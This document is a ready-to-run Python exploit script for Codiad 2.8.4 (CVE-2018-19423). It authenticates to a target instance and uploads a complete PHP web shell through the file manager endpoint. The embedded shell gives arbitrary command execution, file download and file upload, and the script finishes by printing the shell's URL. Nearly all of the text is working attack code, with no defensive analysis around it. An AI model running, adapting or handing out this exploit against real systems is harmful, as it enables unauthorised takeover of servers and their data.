# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)
# Date: 24.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: http://codiad.com/
# Software Link: https://github.com/Codiad/Codiad/releases/tag/v.2.8.4
# Version: 2.8.4
# Tested on Xubuntu 20.04
# CVE: CVE-2018-19423

'''
Description:
Codiad 2.8.4 allows remote authenticated administrators to execute arbitrary code by uploading an executable file.
'''


'''
Import required modules:
'''
import requests
import json
import time
import sys
import urllib.parse

'''
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
codiadpath = input('Please input the path of Codiad( for example: / ): ')
projectname = input('Please input the name of the actual project: ')



'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + codiadpath
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Authentication:
'''
# Compute Content-Length:
base_content_len = 45
username_encoded = urllib.parse.quote(username, safe='')
username_encoded_len = len(username_encoded.encode('utf-8'))
password_encoded = urllib.parse.quote(password, safe='')
password_encoded_len = len(password_encoded.encode('utf-8'))
content_len = base_content_len + username_encoded_len + password_encoded_len

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': '*/*',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': str(content_len),
    'Origin': 'http://' + target_ip + ':' + target_port,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + ':' + target_port + '/',
    'Cookie': cookie
}

# Body:
body = {
    'username': username,
    'password': password,
    'theme': 'default',
    'language': 'en'
}

# Post authentication request:
link_base = 'http://' + target_ip + ':' + target_port + codiadpath
link_auth = link_base + 'components/user/controller.php?action=authenticate'
print('')
print('Posting authentication request: ')
auth = requests.post(link_auth, headers=header, data=body)
print('Response: ')
print(auth.text)
time.sleep(2)


'''
Upload Webshell:
'''
# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    "Content-Type": "multipart/form-data; boundary=---------------------------289777152427948045812862014674",
    'Connection': 'close',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Construct Shell Payload: https://github.com/flozz/p0wny-shell
data = "\r\n\r\n\r\n-----------------------------289777152427948045812862014674\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xc3\xa2\xc2\x80\xc2\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&\")\n                    .replace(/</g, \"<\")\n                    .replace(/>/g, \">\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------289777152427948045812862014674--\r\n"

#Construct link and posting request which will upload the file:
link_exploit = link_base + 'components/filemanager/controller.php?action=upload&path=/var/www/html/data/' + projectname
print('')
print('Posting request wich will upload the file: ')
exploit = requests.post(link_exploit, headers=header, data=data)
print('Response:')
print(exploit.text)
time.sleep(2)


'''
Finish:
'''
print('')
print('File uploaded except you got an error message before. If so please run this program again and correct your',
      'mistakes!')
print('')
print('Path of file on the server: http://' + target_ip + ':' + target_port + codiadpath + '/data/' + projectname + '/' + 'shell.php')
print('')